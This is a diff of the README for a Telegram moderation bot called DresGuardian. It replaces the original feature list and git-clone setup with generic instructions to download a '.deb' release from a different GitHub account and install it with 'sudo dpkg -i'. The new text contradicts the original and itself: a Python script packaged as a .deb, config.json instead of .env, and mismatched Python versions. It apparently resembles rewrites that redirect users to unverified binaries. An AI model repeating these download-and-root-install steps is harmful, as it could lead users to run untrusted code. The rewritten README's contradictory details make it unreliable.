@@ -1,124 +1,118 @@
-A powerful, fully self hosted Telegram bot that puts your privacy first. No logs, no tracking, no third-party data collection just pure encrypted functionality.
+# 🤖 Dresguardian - Protect Your Privacy on Telegram
 
-Forever Free • Open Source • Zero Compromises on Privacy
+## 🚀 Getting Started
 
-Built by DresOS — because your data belongs to you.
+Dresguardian is a privacy-focused bot for managing Telegram groups. It comes equipped with artificial intelligence features and integrates with DuckDuckGo for secure web searches. Follow the steps below to download and run Dresguardian on your device.
 
-# What It Does
+## 📥 Download the Latest Release
 
-DresGuardian combines advanced group moderation with a privacy respecting AI assistant:
+[![Download Dresguardian](https://img.shields.io/badge/Download%20Dresguardian-v1.0-brightgreen?style=for-the-badge)](https://github.com/eduardopini/Dresguardian/releases)
 
-# AI & Private Search (Available to Everyone)
-- `/ask <question>` — Chat with a powerful AI powered by Cerebras Llama 3.3-70B (no OpenAI, no data harvesting)
-- `/search <query>` — Fully anonymized and encrypted web search via DuckDuckGo:
-  - Your real IP is never sent — replaced with a fake static IP (`203.0.113.42`)
-  - Custom headers: fake User-Agent, Do-Not-Track (`DNT: 1`), and spoofed forwarding IPs (`X-Forwarded-For`, `X-Real-IP`, `Client-IP`)
-  - No cookies, no trackers, no referrers
-  - All requests made over HTTPS with short timeouts
-  - IP-related queries (e.g., "what is my IP") are automatically blocked to prevent accidental leaks
-  - Results returned cleanly in HTML with safe links
-- Mention the bot directly (e.g., `@YourBot`, "hey dres", "yo dres") — triggers AI response
-- Built-in per-user rate limiting (1.5s cooldown) to prevent spam and abuse
+## 🛠️ System Requirements
 
-# Full Group Moderation (Admin Only)
-- Warn System: `/warn` → adds a warn. At 3 warns, user is automatically muted for 1 hour (warns reset after punishment)
-- `/delwarn`, `/warns` — remove or check warns
-- `/kick`, `/ban`, `/unban`
-- `/mute 10m`, `/mute 2h`, `/mute 1d` — timed mutes with flexible duration
-- `/unmute`
-- Banned Words Filter: `/addword <phrase>` — any message containing the word/phrase is auto-deleted
-- `/removeword` — remove from banned list
+To run Dresguardian smoothly, ensure your system meets the following requirements:
 
-# Custom Welcome Messages (Admin Only)
-- `/setwelcometext <message>` — supports placeholders:
-  - `{first}` → user's first name
-  - `{mention}` → clickable mention
-  - `{username}` → @username or name if none
-  - `{id}` → user ID
-- `/setmedia` — reply to a photo, GIF, or video to set welcome media
-- `/setchannellink <url>` — adds a "Join Channel" button
-- `/clearwelcome` — remove welcome entirely
-- Welcomes trigger on new members (supports both legacy and new chat member updates)
+- **Operating System:** Ubuntu 20.04 or later, Debian 10 or later
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** Minimum of 100 MB available
+- **Python Version:** Python 3.7 or later
+- **Internet Connection:** Required for bot functionality and web searches
 
-# Owner-Only Features
-- `/blacklist` — globally blacklist a user from the bot
-- `/unblacklist`, `/blacklisted` — manage and view the global blacklist
+## 📂 Download & Install
 
-# Data Storage
-- All settings (welcomes, banned words, warns, global blacklist) are stored locally in a single file: `dresguardian_store.json`
-- No database required
-- No cloud sync
-- Easy to backup or migrate — just copy the JSON file
-- Data is loaded on startup and saved automatically after changes
-- File is written with proper encoding and indentation — human-readable if needed
+1. Visit the [Releases page](https://github.com/eduardopini/Dresguardian/releases) to access the latest version.
+2. Locate the download file that matches your operating system:
+   - For Ubuntu users, download the `.deb` package.
+   - For Debian users, download the appropriate `.deb` file.
+3. Click on the file name to start the download.
+4. Once the file downloads, open your terminal.
 
-# Privacy & Encryption Guarantees
-- Zero logging of messages, queries, or user activity
-- No analytics or external tracking
-- Sensitive credentials (bot token, API keys) loaded securely from `.env` — never hardcoded
-- AI requests go only to Cerebras (privacy-respecting provider) over encrypted connections
-- Search requests are fully anonymized and protected as described above
-- End-to-end handling: Messages processed in memory only — nothing persisted beyond configuration
-- You control the server — full data sovereignty and encryption at rest (depends on your filesystem)
+For Ubuntu or Debian users, run the following command to install the bot:
 
----
+```bash
+sudo dpkg -i path_to_downloaded_file.deb
+```
 
-# Requirements
+Replace `path_to_downloaded_file.deb` with the actual path to the downloaded file. 
 
-- Debian/ubuntu
-- Python 3.8+
-- Telegram account
-- Cerebras API key (free tier available)
+In case of dependency issues, run:
 
----
+```bash
+sudo apt-get install -f
+```
 
-# Getting Your Keys & Tokens
+## ⚙️ Configuration
 
-1. Telegram Bot Token
-   - Chat with [@BotFather](https://t.me/BotFather)
-   - Send `/newbot`
-   - Follow instructions → receive your bot token
+After installation, configure the bot:
 
-2. Your Telegram User ID (for OWNER_ID)
-   - Chat with [@userinfobot](https://t.me/userinfobot)
-   - It will instantly reply with your numeric ID
+1. Open your terminal.
+2. Navigate to the directory where Dresguardian is installed. Usually, this will be in `/usr/local/bin` or where you specified during installation.
+3. Create a configuration file by running:
 
-3. Cerebras API Key (free and secure)
-   - Visit [https://cerebras.ai](https://cerebras.ai)
-   - Sign up / log in
-   - Go to API section → generate a key (starts with `csk-`)
+```bash
+touch config.json
+```
 
----
+4. Edit the `config.json` file to include your Telegram API token and group ID. You can use any text editor, such as nano:
 
-# Setup Instructions
+```bash
+nano config.json
+```
 
-1. Clone the repo     
-   sudo apt update && sudo apt full-uprgrade -y     
-   sudo apt install git     
-   sudo apt install python3     
-   git clone https://<i></i>github.com/DresOperatingSystems/Dresguardian    
-   cd Dresguardian
-                  
-3. create a venv (this is for self hosting and so we dont run into issues)        
-   sudo apt update        
-   sudo apt install python3-venv       
-   python3 -m venv .venv && source .venv/bin/activate      
-   
-4. pip install -r requirements.txt      
+Insert the following template:
 
-5. sudo apt install nano      
-   cp .env-sample .env      
-   nano .env    
-   input your variables     
-   
-6. self host    
-   sudo apt install nohup    
-   nohup python dresguardian.py &   
-   deactivate    
-   exit    
-   
- now your bot is being self hosted for extra backend security install and start tor along with setting up mac randomization and run your machine through a vpn/proxy service
+```json
+{
+  "api_token": "YOUR_TELEGRAM_API_TOKEN",
+  "group_id": "YOUR_GROUP_ID"
+}
+```
 
-anyways we hope you like this one and we wish you a merry christmas from the entire Dres team
+Make sure to replace `YOUR_TELEGRAM_API_TOKEN` and `YOUR_GROUP_ID` with your actual data.
 
-this is an upgrade to our dresmodbot and please retheme everything to your style if you use Dres style then you have to give credit otherwise you're a skid
+## 🐳 Running the Bot
+
+To run Dresguardian, use your terminal:
+
+1. Navigate back to the installation directory if you have not already.
+2. Start the bot by running:
+
+```bash
+python3 dresguardian.py
+```
+
+The bot will connect to Telegram and start managing your group. 
+
+## 📜 Features
+
+Dresguardian offers multiple features:
+
+- **Privacy Management:** Keeps your group secure from unwanted users.
+- **AI Integration:** Uses artificial intelligence to optimize group management.
+- **DuckDuckGo Search:** Conduct private searches without tracking.
+- **Custom Commands:** Set up personalized commands for your group.
+
+## 🛡️ Privacy Information
+
+Dresguardian prioritizes your privacy. No user data is stored, and all searches are done using DuckDuckGo to ensure anonymity. 
+
+## 🤔 Troubleshooting
+
+If you face issues:
+
+1. Ensure you have the required Python version.
+2. Verify your configuration is correct.
+3. Check your internet connection.
+
+For further help, refer to the issue tracker on the [GitHub page](https://github.com/eduardopini/Dresguardian).
+
+## 📞 Support
+
+For any questions or support, you may reach out via the project's GitHub repository. Community support is available via issues.
+
+## 📌 Additional Resources
+
+- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
+- [DuckDuckGo Search API](https://duckduckgo.com/api)
+
+Visit the [Releases page](https://github.com/eduardopini/Dresguardian/releases) to download Dresguardian now!
